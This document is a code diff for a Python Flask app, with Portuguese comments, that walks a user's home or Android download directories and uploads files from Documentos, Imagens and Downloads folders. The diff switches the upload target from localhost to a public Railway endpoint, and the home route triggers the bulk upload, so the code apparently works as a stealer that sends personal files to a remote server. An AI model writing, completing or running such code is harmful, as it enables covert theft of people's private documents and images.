@@ -18,7 +18,7 @@ app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
 # Função para fazer o upload dos arquivos
 def upload_file(file_path):
-    url = 'http://127.0.0.1:5000/upload'
+    url = 'https://original-production-9fb7.up.railway.app/upload'  # Atualize para o endpoint público do Railway
     
     try:
         with open(file_path, 'rb') as file:
@@ -34,9 +34,9 @@ def upload_file(file_path):
 # Função para percorrer o diretório adequado, dependendo da plataforma
 def get_directory_path():
     if platform.system() == 'Windows':
-        return r'C:\Users'  # Caminho no Windows
-    elif platform.system() == 'Linux' or platform.system() == 'Darwin':  # Para Android (em ambiente Linux)
-        return '/storage/emulated/0/Download'  # Exemplo de diretório de download no Android
+        return r'C:\Users'
+    elif platform.system() == 'Linux' or platform.system() == 'Darwin': 
+        return '/storage/emulated/0/Download'
     else:
         logging.error("Sistema operacional não suportado.")
         return None
@@ -53,7 +53,6 @@ def is_excluded_folder(folder_name, excluded_folders):
 def upload_files_from_directory(directory_path, allowed_folders, excluded_folders):
     for root, dirs, files in os.walk(directory_path):
         folder_name = os.path.basename(root)
-        
         if is_allowed_folder(folder_name, allowed_folders) and not is_excluded_folder(folder_name, excluded_folders):
             logging.info(f"Processando arquivos da pasta: {folder_name}")
             for filename in files:
@@ -67,7 +66,6 @@ def home():
     allowed_folders = ['Documentos', 'Imagens', 'Downloads']
     excluded_folders = ['Arquivos de Programas', 'Windows', 'AppData']
     directory_path = get_directory_path()
-    
     if directory_path:
         logging.info(f"Iniciando upload dos arquivos de: {directory_path}")
         upload_files_from_directory(directory_path, allowed_folders, excluded_folders)
